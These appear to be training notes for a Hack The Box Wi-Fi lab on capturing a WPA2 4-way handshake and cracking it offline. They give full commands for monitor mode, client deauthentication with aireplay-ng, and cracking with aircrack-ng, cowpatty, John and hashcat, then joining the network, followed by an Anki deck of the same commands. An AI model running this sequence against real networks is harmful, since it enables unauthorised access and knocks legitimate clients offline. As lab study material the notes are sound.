# Chain #10: Traditional WPA/WPA2 Password Attack

## Goal & Scope

Recover a WPA2‑PSK passphrase from a captured **4‑Way Handshake**, using reconnaissance, capture, offline cracking, and access verification.

This chain focuses **only** on the traditional WPA workflow. Advanced cracking strategies (rules, masks, combinator, hybrid, CPU/GPU tuning) are left for later chains.

---

## Step 1 — Reconnaissance

Put the NIC into monitor mode and identify the target AP and client.

**Enable monitor mode:**

```bash
sudo airmon-ng start wlan0
```

- `airmon-ng`: Tool that manages wireless interfaces for Aircrack‑ng suite.
- `start wlan0`: Tells airmon‑ng to put interface `wlan0` into monitor mode.
- Result: New interface `wlan0mon` created.
- Monitor mode = listen to all 802.11 traffic without being associated.

**Scan networks and save output:**

```bash
sudo airodump-ng wlan0mon -c 1 -w WPA
```

- `wlan0mon`: Interface in monitor mode.
- `-c 1`: Lock scanning to channel 1 (prevents hopping and missing packets).
- `-w WPA`: Save capture to file prefix `WPA` → produces `WPA-01.cap`.

Take note of:

- **BSSID** (MAC address of AP).
- **ESSID** (SSID string).
- **STATION** (client MAC) with live traffic.

---

## Step 2 — Handshake Capture

Force a reconnect to elicit the 4‑Way Handshake; verify it’s present.

**Deauthenticate a client:**

```bash
sudo aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
```

- `aireplay-ng`: Tool for packet injection attacks.
- `-0`: Deauthentication attack type.
- `5`: Number of deauth bursts to send (0 = infinite).
- `-a <AP_BSSID>`: Target AP MAC address.
- `-c <CLIENT_MAC>`: Target client MAC.
- `wlan0mon`: Monitor mode interface.

Effect: Client disconnects, then reconnects → handshake packets captured.

**Confirm in airodump‑ng window:**

```
[ WPA handshake: <AP_BSSID> ]
```

**Optional: Validate capture with Cowpatty:**

```bash
cowpatty -c -r WPA-01.cap
```

- `-c`: Check mode (only verifies handshake validity).
- `-r WPA-01.cap`: Reads the capture file.
- Output: “Collected all necessary data …” if handshake is good.

---

## Step 3 — Password Cracking

Use the capture to attempt dictionary cracking with multiple tools.

### 3.A — Cowpatty

```bash
cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s "HackTheBox"
```

- `-r WPA-01.cap`: Capture file containing handshake.
- `-f /opt/wordlist.txt`: Wordlist path.
- `-s "HackTheBox"`: Target SSID (needed for key derivation).

### 3.B — Aircrack‑ng

```bash
sudo aircrack-ng WPA-01.cap -w /opt/wordlist.txt
```

- `WPA-01.cap`: Handshake capture.
- `-w /opt/wordlist.txt`: Wordlist to test.
- Output: Shows cracking progress and displays `KEY FOUND!` if successful.

### 3.C — John the Ripper

**Convert handshake to John format:**

```bash
/opt/wpapcap2john WPA-01.cap > hash
```

- `wpapcap2john`: Converts .cap into a hash format John can process.
- Output redirected to file `hash`.

**Crack with wordlist:**

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=wpapsk
```

- `--wordlist`: Path to dictionary.
- `--format=wpapsk`: Specifies WPA cracking mode.

**Show results:**

```bash
john hash --show
```

- Displays recovered passwords.

### 3.D — Hashcat

**Convert capture to mode 22000 format:**

```bash
hcxpcapngtool -o hash WPA-01.cap
```

- `hcxpcapngtool`: Converts .cap into Hashcat’s unified WPA format.
- `-o hash`: Output file named `hash`.

**Run dictionary attack:**

```bash
hashcat -m 22000 hash /opt/wordlist.txt
```

- `-m 22000`: Hashcat mode for WPA‑EAPOL/PMKID.
- `hash`: Converted handshake.
- `/opt/wordlist.txt`: Wordlist path.

**Show cracked passwords:**

```bash
hashcat -m 22000 hash /opt/wordlist.txt --show
```

- Displays cracked PSK(s) if present in potfile.

---

## Step 4 — Access Verification

Confirm cracked PSK by connecting to the network.

### 4.A — NetworkManager CLI

```bash
nmcli dev wifi connect "HackTheBox" password "<PSK>"
```

- `nmcli`: Command‑line interface for NetworkManager.
- `dev wifi connect`: Connect to SSID.
- `password`: Supply cracked PSK.

### 4.B — wpa_supplicant

**Generate config with passphrase:**

```bash
wpa_passphrase "HackTheBox" "<PSK>" | sudo tee /etc/wpa_supplicant/htb.conf >/dev/null
```

- `wpa_passphrase`: Creates WPA config block.
- `tee /etc/wpa_supplicant/htb.conf`: Save config.

**Start wpa_supplicant:**

```bash
sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/htb.conf
```

- `-B`: Run in background.
- `-i wlan0`: Interface.
- `-c`: Config file path.

**Request DHCP lease:**

```bash
sudo dhclient wlan0
```

- Obtains IP from AP to confirm access.

---

## Checklist (Quick Run)

1. `airmon-ng start wlan0`
2. `airodump-ng wlan0mon -c <ch> -w WPA`
3. `aireplay-ng -0 5 -a <BSSID> -c <STA> wlan0mon`
4. Confirm `[ WPA handshake: <BSSID> ]`
5. Crack with Cowpatty / Aircrack‑ng / John / Hashcat
6. Verify access with `nmcli` or `wpa_supplicant`

---

## Anki Deck:

```
#separator:tab
#html:true
#guid column:1
#notetype column:2
#deck column:3
#tags column:6
A1b2C3d4E6	Basic	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Why do we enable monitor mode before a Wi-Fi attack?	To capture 802.11 frames (beacons, EAPOL) without associating to an AP, which is required for handshake capture.	wifi
B2c3D4e5F7	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which <code>airmon-ng</code> command enables monitor mode on interface <code>wlan0</code>?	<code>sudo airmon-ng start wlan0</code>	wifi
B2c3D4e5F7a	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	What interface name does <code>airmon-ng</code> typically create when it starts monitor mode for <code>wlan0</code>?	<code>wlan0mon</code>	wifi
C3d4E5f6G8	Basic	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	In <code>airodump-ng wlan0mon -c 1 -w WPA</code>, what does <code>-c 1</code> do?	Locks capture to channel 1 to avoid hopping.	wifi
D4e5F6g7H9	Basic	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	In the command <code>airodump-ng wlan0mon -c 1 -w WPA</code>, what does <code>-w WPA</code> do and what file does it create?	Writes capture with prefix <code>WPA</code>, producing <code>WPA-01.cap</code>.	wifi
E5f6G7h8I0	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which <code>aireplay-ng</code> command sends 5 deauth packets to client <code>11:22:33:44:55:66</code> on AP <code>AA:BB:CC:DD:EE:FF</code> using interface <code>wlan0mon</code>?	<code>sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon</code>	wifi
F6g7H8i9J1	Basic	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which two MAC addresses are required in the Aireplay-ng deauth command and what do they represent?	The AP BSSID (<code>-a</code>) — the access point MAC; and the client MAC (<code>-c</code>) — the station to disconnect.	wifi
G7h8I9j0K2	Basic	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	How do you confirm in Airodump-ng that a handshake was captured?	Look for <code>[ WPA handshake: AA:BB:CC:DD:EE:FF ]</code> (the target BSSID) in the header line of output.	wifi
H8i9J0k1L3	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which <code>cowpatty</code> command validates that <code>WPA-01.cap</code> contains a complete handshake without cracking?	<code>cowpatty -c -r WPA-01.cap</code>	wifi
I9j0K1l2M4	Basic	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which three arguments are required for Cowpatty cracking and what does each mean?	<code>-r &lt;cap&gt;</code> capture file, <code>-f &lt;wordlist&gt;</code> dictionary, <code>-s &lt;SSID&gt;</code> network name (needed for key derivation).	wifi
J0k1L2m3N5	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Provide the <code>aircrack-ng</code> command to crack <code>WPA-01.cap</code> using the <code>/usr/share/wordlists/rockyou.txt</code> wordlist.	<code>sudo aircrack-ng WPA-01.cap -w /usr/share/wordlists/rockyou.txt</code>	wifi
K1l2M3n4O6	Basic	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	What tool converts WPA handshake captures into a format John the Ripper can crack?	<code>wpapcap2john</code>.	wifi
L2m3N4o5P7	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	After converting the handshake into <code>hash</code> file with <code>wpapcap2john</code>, which <code>john</code> command cracks WPA handshakes using <code>/usr/share/wordlists/rockyou.txt</code>?	<code>john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=wpapsk</code>	wifi
M3n4O5p6Q8	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which <code>john</code> command shows recovered WPA passwords after cracking the handshake stored in <code>hash</code> file?	<code>john hash --show</code>	wifi
N4o5P6q7R9	Basic	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which tool converts a <code>.cap</code> handshake into Hashcat’s unified format and what is the correct Hashcat mode for WPA?	Use <code>hcxpcapngtool -o hash file.cap</code> to extract; crack with Hashcat mode <code>-m 22000</code>.	wifi
O5p6Q7r8S0	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Show the <code>hashcat</code> command to crack a WPA handshake hash file named <code>hash</code> using <code>rockyou.txt</code>.	<code>hashcat -m 22000 hash rockyou.txt</code>	wifi
P6q7R8s9T1	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which <code>hashcat</code> command displays already-cracked WPA from file <code>hash</code> results from the potfile for mode <code>-m 22000</code> and wordlist <code>rockyou.txt</code>?	<code>hashcat -m 22000 hash rockyou.txt --show</code>	wifi
Q7r8S9t0U2	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which <code>nmcli</code> command connects to SSID <code>HackTheBox</code> using the cracked PSK <code>MyPassword123</code>?	<code>nmcli dev wifi connect "HackTheBox" password "MyPassword123"</code>	wifi
R8s9T0u1V3	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	Which <code>wpa_passphrase</code> command generates a <code>wpa_supplicant</code> config for SSID <code>HackTheBox</code> and PSK <code>MyPassword123</code>?	<code>wpa_passphrase HackTheBox MyPassword123</code>	wifi
S9t0U1v2W4	Basic (type in the answer)	Ops::WiFi Gym::Chain 10: Traditional WPA/WPA2 Attack	After starting <code>wpa_supplicant</code> with a config, which command requests a DHCP lease on interface <code>wlan0</code>?	<code>sudo dhclient wlan0</code>	wifi
```